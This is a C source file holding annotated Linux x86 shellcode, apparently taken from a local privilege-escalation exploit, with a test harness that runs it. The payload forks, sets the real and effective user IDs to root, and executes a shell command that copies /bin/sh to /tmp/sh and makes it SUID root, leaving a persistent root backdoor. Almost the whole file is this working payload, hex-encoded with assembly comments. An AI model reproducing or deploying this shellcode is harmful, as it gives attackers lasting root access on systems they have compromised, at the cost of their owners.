/*
   linux/x86 (shamelessly ripped from one of my unpublished exploits)
*/
/*
   fork()'s, does setreuid(0, 0); then execve()'s:
     /bin/sh -c "cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh"

   hence dropping a SUID root shell in /tmp.
*/

char shellc[] =
/* Shellcode to drop a SUID root shell in /tmp/sh.
   Forgive the Intel syntax in the commenting, bored with AT&T syntax..
 */

/* main: if (fork()) goto exeunt; else goto carryon; */
"\x29\xc0"                                 /* sub ax, ax               */
"\xb0\x02"                                 /* mov al, 2                */
"\xcd\x80"                                 /* int 0x80                 */
"\x85\xc0"                                 /* test ax, ax              */
"\x75\x02"                                 /* jnz exeunt               */
"\xeb\x05"                                 /* jmp carryon              */

/* exeunt: exit(x); */
"\x29\xc0"                                 /* sub ax, ax               */
"\x40"                                     /* inc ax                   */
"\xcd\x80"                                 /* int 0x80                 */

/* carryon: setreuid(0, 0); goto callz; */
"\x29\xc0"                                 /* sub ax, ax               */
"\x29\xdb"                                 /* sub bx, bx               */
"\x29\xc9"                                 /* sub cx, cx               */
"\xb0\x46"                                 /* mov al, 0x46             */
"\xcd\x80"                                 /* int 0x80                 */
"\xeb\x2a"                                 /* jmp callz                */

/* start: execve() */
"\x5e"                                     /* pop si                   */
"\x89\x76\x32"                             /* mov [bp+0x32], si        */
"\x8d\x5e\x08"                             /* lea bx, [bp+0x08]        */
"\x89\x5e\x36"                             /* mov [bp+0x36], bx        */
"\x8d\x5e\x0b"                             /* lea bx, [bp+0x0b]        */
"\x89\x5e\x3a"                             /* mov [bp+0x3a], bx        */
"\x29\xc0"                                 /* sub ax, ax               */
"\x88\x46\x07"                             /* mov [bp+0x07], al        */
"\x88\x46\x0a"                             /* mov [bp+0x0a], al        */
"\x88\x46\x31"                             /* mov [bp+0x31], al        */
"\x89\x46\x3e"                             /* mov [bp+0x3e], ax        */
"\x87\xf3"                                 /* xchg si, bx              */
"\xb0\x0b"                                 /* mov al, 0x0b             */
"\x8d\x4b\x32"                             /* lea cx, [bp+di+0x32]     */
"\x8d\x53\x3e"                             /* lea dx, [bp+di+0x3e]     */
"\xcd\x80"                                 /* int 0x80                 */

/* callz: call start */
"\xe8\xd1\xff\xff\xff"                     /* call start               */

/* data - command to execve() */
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f"
"\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34"
"\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68";

/** test out the shellcode **/
main ()
{
  void (*sc)() = (void *)shellc; sc();
}